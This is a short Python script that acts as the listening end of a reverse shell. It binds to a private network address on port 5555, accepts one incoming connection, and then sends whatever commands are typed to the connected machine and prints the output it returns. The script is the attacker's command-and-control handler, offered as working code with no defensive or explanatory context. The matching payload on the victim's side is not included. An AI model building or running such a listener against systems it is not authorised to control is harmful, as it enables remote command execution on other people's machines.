import socket


def shell(computer, address):
    while True:
        command = input(f"Shell@{address}~  ")
        computer.send(command.encode())
        receive_output(computer)


def receive_output(computer):
    receive = computer.recv(1024).decode()
    print(f"#output {receive}")


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('192.168.141.86', 5555))
print("# Listening for stuff")
socket.listen(5)

target, ip = socket.accept()
print(f"Connected from {ip}")

shell(target, ip)

# received_data = target.recv(1024)
# print(f"# Received \t{received_data}")

socket.close()
